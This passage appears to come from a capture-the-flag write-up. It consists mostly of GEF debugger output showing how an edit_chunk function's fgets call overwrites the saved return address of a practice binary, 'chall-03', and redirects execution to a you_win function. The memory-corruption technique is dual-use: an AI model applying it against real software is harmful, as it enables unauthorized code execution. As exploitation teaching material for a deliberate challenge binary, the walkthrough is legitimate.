$rsp   : 0x00007ffc06678bf0  →  0x0000005000000000
$rbp   : 0x00007ffc06678c00  →  0x00007ffc06678c20  →  0x0000000000000001
$rsi   : 0x50            
$rdi   : 0x00007ffc06678c08  →  0x0000560223128274  →  <main+107> jmp 0x560223128215 <main+12>
$rip   : 0x0000560223128695  →  <edit_chunk+183> call 0x5602231280f0 <fgets@plt>
$r8 : 0x0            
$r9 : 0x0            
$r10   : 0x00007ffc06678987  →  0x007f4a2984f2b200
$r11   : 0x202           
$r12   : 0x00007ffc06678d38  →  0x00007ffc0667a486  →  "./chall-03"
$r13   : 0x0000560223128209  →  <main+0> endbr64
$r14   : 0x000056022312ad80  →  0x00005602231281c0  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007f4a29b70020  →  0x00007f4a29b712e0  →  0x0000560223127000  →   jg 0x560223127047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffc06678bf0│+0x0000: 0x0000005000000000   ← $rsp
0x00007ffc06678bf8│+0x0008: 0x00007ffc06678c08  →  0x0000560223128274  →  <main+107> jmp 0x560223128215 <main+12>
0x00007ffc06678c00│+0x0010: 0x00007ffc06678c20  →  0x0000000000000001   ← $rbp
0x00007ffc06678c08│+0x0018: 0x0000560223128274  →  <main+107> jmp 0x560223128215 <main+12>   ← $rax, $rdi
0x00007ffc06678c10│+0x0020: 0x0000000000000000
0x00007ffc06678c18│+0x0028: 0x0000000329b58080
0x00007ffc06678c20│+0x0030: 0x0000000000000001
0x00007ffc06678c28│+0x0038: 0x00007f4a29823fbd  →  <__libc_start_call_main+109> mov edi, eax
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x56022312868c <edit_chunk+174> mov  rax, QWORD PTR [rbp-0x8]
   0x560223128690 <edit_chunk+178> mov  esi, ecx
   0x560223128692 <edit_chunk+180> mov  rdi, rax
 → 0x560223128695 <edit_chunk+183> call   0x5602231280f0 <fgets@plt>
   ↳  0x5602231280f0 <fgets@plt+0>  endbr64
    0x5602231280f4 <fgets@plt+4>    bnd jmp QWORD PTR [rip+0x2ec5]      # 0x56022312afc0 <fgets@got.plt>
    0x5602231280fb <fgets@plt+11>   nop DWORD PTR [rax+rax*1+0x0]
    0x560223128100 <malloc@plt+0>   endbr64
    0x560223128104 <malloc@plt+4>   bnd jmp QWORD PTR [rip+0x2ebd]      # 0x56022312afc8 <malloc@got.plt>
    0x56022312810b <malloc@plt+11>  nop DWORD PTR [rax+rax*1+0x0]
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
fgets@plt (
   $rdi = 0x00007ffc06678c08 → 0x0000560223128274 → <main+107> jmp 0x560223128215 <main+12>,
   $rsi = 0x0000000000000050,
   $rdx = 0x00007f4a29a2cac0 → 0x00000000fbad2088,
   $rcx = 0x0000000000000050
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-03", stopped 0x560223128695 in edit_chunk (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x560223128695 → edit_chunk()
[#1] 0x560223128274 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rdi
$2 = 0x7ffc06678c08
gef➤  i f
Stack level 0, frame at 0x7ffc06678c10:
 rip = 0x560223128695 in edit_chunk; saved rip = 0x560223128274
 called by frame at 0x7ffc06678c30
 Arglist at 0x7ffc06678c00, args:
 Locals at 0x7ffc06678c00, Previous frame's sp is 0x7ffc06678c10
 Saved registers:
  rbp at 0x7ffc06678c00, rip at 0x7ffc06678c08
gef➤  x/g 0x7ffc06678c08
0x7ffc06678c08: 0x560223128274
gef➤  x/g 0x560223128274
0x560223128274 <main+107>:  0xc7504fc7d839feb
gef➤  si
0x00005602231280f0 in fgets@plt ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007ffc06678c08  →  0x0000560223128274  →  <main+107> jmp 0x560223128215 <main+12>
$rbx   : 0x0             
$rcx   : 0x50            
$rdx   : 0x00007f4a29a2cac0  →  0x00000000fbad2088
$rsp   : 0x00007ffc06678be8  →  0x000056022312869a  →  <edit_chunk+188> lea rax, [rip+0xc10]        # 0x5602231292b1
$rbp   : 0x00007ffc06678c00  →  0x00007ffc06678c20  →  0x0000000000000001
$rsi   : 0x50            
$rdi   : 0x00007ffc06678c08  →  0x0000560223128274  →  <main+107> jmp 0x560223128215 <main+12>
$rip   : 0x00005602231280f0  →  <fgets@plt+0> endbr64
$r8 : 0x0            
$r9 : 0x0            
$r10   : 0x00007ffc06678987  →  0x007f4a2984f2b200
$r11   : 0x202           
$r12   : 0x00007ffc06678d38  →  0x00007ffc0667a486  →  "./chall-03"
$r13   : 0x0000560223128209  →  <main+0> endbr64
$r14   : 0x000056022312ad80  →  0x00005602231281c0  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007f4a29b70020  →  0x00007f4a29b712e0  →  0x0000560223127000  →   jg 0x560223127047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffc06678be8│+0x0000: 0x000056022312869a  →  <edit_chunk+188> lea rax, [rip+0xc10]        # 0x5602231292b1    ← $rsp
0x00007ffc06678bf0│+0x0008: 0x0000005000000000
0x00007ffc06678bf8│+0x0010: 0x00007ffc06678c08  →  0x0000560223128274  →  <main+107> jmp 0x560223128215 <main+12>
0x00007ffc06678c00│+0x0018: 0x00007ffc06678c20  →  0x0000000000000001   ← $rbp
0x00007ffc06678c08│+0x0020: 0x0000560223128274  →  <main+107> jmp 0x560223128215 <main+12>   ← $rax, $rdi
0x00007ffc06678c10│+0x0028: 0x0000000000000000
0x00007ffc06678c18│+0x0030: 0x0000000329b58080
0x00007ffc06678c20│+0x0038: 0x0000000000000001
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5602231280e0 <printf@plt+0>   endbr64
   0x5602231280e4 <printf@plt+4>   bnd  jmp QWORD PTR [rip+0x2ecd]      # 0x56022312afb8 <printf@got.plt>
   0x5602231280eb <printf@plt+11>  nop  DWORD PTR [rax+rax*1+0x0]
 → 0x5602231280f0 <fgets@plt+0> endbr64
   0x5602231280f4 <fgets@plt+4> bnd jmp QWORD PTR [rip+0x2ec5]      # 0x56022312afc0 <fgets@got.plt>
   0x5602231280fb <fgets@plt+11>   nop  DWORD PTR [rax+rax*1+0x0]
   0x560223128100 <malloc@plt+0>   endbr64
   0x560223128104 <malloc@plt+4>   bnd  jmp QWORD PTR [rip+0x2ebd]      # 0x56022312afc8 <malloc@got.plt>
   0x56022312810b <malloc@plt+11>  nop  DWORD PTR [rax+rax*1+0x0]
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-03", stopped 0x5602231280f0 in fgets@plt (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5602231280f0 → fgets@plt()
[#1] 0x56022312869a → edit_chunk()
[#2] 0x560223128274 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  finish
Run till exit from #0  0x00005602231280f0 in fgets@plt ()
0x000056022312869a in edit_chunk ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007ffc06678c08  →  0x00005602231282d0  →  <you_win+0> endbr64
$rbx   : 0x0             
$rcx   : 0x000056022331f6b9  →  0x0000000000000000
$rdx   : 0xfbad2088      
$rsp   : 0x00007ffc06678bf0  →  0x0000005000000000
$rbp   : 0x00007ffc06678c00  →  0x00007ffc06678c20  →  0x0000000000000001
$rsi   : 0xa00005602231282
$rdi   : 0x00007f4a29a2e900  →  0x0000000000000000
$rip   : 0x000056022312869a  →  <edit_chunk+188> lea rax, [rip+0xc10]       # 0x5602231292b1
$r8 : 0x0            
$r9 : 0x0            
$r10   : 0x00007ffc06678987  →  0x007f4a2984f2b200
$r11   : 0x246           
$r12   : 0x00007ffc06678d38  →  0x00007ffc0667a486  →  "./chall-03"
$r13   : 0x0000560223128209  →  <main+0> endbr64
$r14   : 0x000056022312ad80  →  0x00005602231281c0  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007f4a29b70020  →  0x00007f4a29b712e0  →  0x0000560223127000  →   jg 0x560223127047
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffc06678bf0│+0x0000: 0x0000005000000000   ← $rsp
0x00007ffc06678bf8│+0x0008: 0x00007ffc06678c08  →  0x00005602231282d0  →  <you_win+0> endbr64
0x00007ffc06678c00│+0x0010: 0x00007ffc06678c20  →  0x0000000000000001   ← $rbp
0x00007ffc06678c08│+0x0018: 0x00005602231282d0  →  <you_win+0> endbr64   ← $rax
0x00007ffc06678c10│+0x0020: 0x000000000000000a ("\n"?)
0x00007ffc06678c18│+0x0028: 0x0000000329b58080
0x00007ffc06678c20│+0x0030: 0x0000000000000001
0x00007ffc06678c28│+0x0038: 0x00007f4a29823fbd  →  <__libc_start_call_main+109> mov edi, eax
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x560223128690 <edit_chunk+178> mov  esi, ecx
   0x560223128692 <edit_chunk+180> mov  rdi, rax
   0x560223128695 <edit_chunk+183> call   0x5602231280f0 <fgets@plt>
 → 0x56022312869a <edit_chunk+188> lea  rax, [rip+0xc10]        # 0x5602231292b1
   0x5602231286a1 <edit_chunk+195> mov  rdi, rax
   0x5602231286a4 <edit_chunk+198> call   0x5602231280c0 <puts@plt>
   0x5602231286a9 <edit_chunk+203> leave  
   0x5602231286aa <edit_chunk+204> ret    
   0x5602231286ab <free_chunk+0>   endbr64
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-03", stopped 0x56022312869a in edit_chunk (), reason: TEMPORARY BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x56022312869a → edit_chunk()
[#1] 0x5602231282d0 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  i f
Stack level 0, frame at 0x7ffc06678c10:
 rip = 0x56022312869a in edit_chunk; saved rip = 0x5602231282d0
 called by frame at 0x7ffc06678c30
 Arglist at 0x7ffc06678c00, args:
 Locals at 0x7ffc06678c00, Previous frame's sp is 0x7ffc06678c10
 Saved registers:
  rbp at 0x7ffc06678c00, rip at 0x7ffc06678c08
gef➤  x/g 0x5602231282d0
0x5602231282d0 <you_win>:   0xe5894855fa1e0ff3
gef➤  b *you_win
Breakpoint 2 at 0x5602231282d0
gef➤  c
Continuing.

Breakpoint 2, 0x00005602231282d0 in you_win ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x19            
$rbx   : 0x0             
$rcx   : 0x00007f4a298f53b4  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x0             
$rsp   : 0x00007ffc06678c10  →  0x000000000000000a ("\n"?)
$rbp   : 0x00007ffc06678c20  →  0x0000000000000001
$rsi   : 0x000056022331f2a0  →  "\nChunk has been edited!\nontent:\n View Chunk\n3.[...]"
$rdi   : 0x00007f4a29a2e8f0  →  0x0000000000000000
$rip   : 0x00005602231282d0  →  <you_win+0> endbr64
$r8 : 0x0            
$r9 : 0x0            
$r10   : 0x00007ffc06678987  →  0x007f4a2984f2b200
$r11   : 0x202           
$r12   : 0x00007ffc06678d38  →  0x00007ffc0667a486  →  "./chall-03"
$r13   : 0x0000560223128209  →  <main+0> endbr64
$r14   : 0x000056022312ad80  →  0x00005602231281c0  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007f4a29b70020  →  0x00007f4a29b712e0  →  0x0000560223127000  →   jg 0x560223127047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffc06678c10│+0x0000: 0x000000000000000a ("\n"?)   ← $rsp
0x00007ffc06678c18│+0x0008: 0x0000000329b58080
0x00007ffc06678c20│+0x0010: 0x0000000000000001   ← $rbp
0x00007ffc06678c28│+0x0018: 0x00007f4a29823fbd  →  <__libc_start_call_main+109> mov edi, eax
0x00007ffc06678c30│+0x0020: 0x00007f4a29b3c000  →  0x03010102464c457f
0x00007ffc06678c38│+0x0028: 0x0000560223128209  →  <main+0> endbr64
0x00007ffc06678c40│+0x0030: 0x0000000106678d20
0x00007ffc06678c48│+0x0038: 0x00007ffc06678d38  →  0x00007ffc0667a486  →  "./chall-03"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5602231282c1 <main+184>    mov eax, 0x0
   0x5602231282c6 <main+189>    call   0x5602231280e0 <printf@plt>
   0x5602231282cb <main+194>    jmp 0x560223128215 <main+12>
 → 0x5602231282d0 <you_win+0>   endbr64
   0x5602231282d4 <you_win+4>   push   rbp
   0x5602231282d5 <you_win+5>   mov rbp, rsp
   0x5602231282d8 <you_win+8>   lea rax, [rip+0xdb8]        # 0x560223129097
   0x5602231282df <you_win+15>  mov rdi, rax
   0x5602231282e2 <you_win+18>  call   0x5602231280c0 <puts@plt>
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-03", stopped 0x5602231282d0 in you_win (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5602231282d0 → you_win()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Just like that, we've seen that we were able to get code execution.
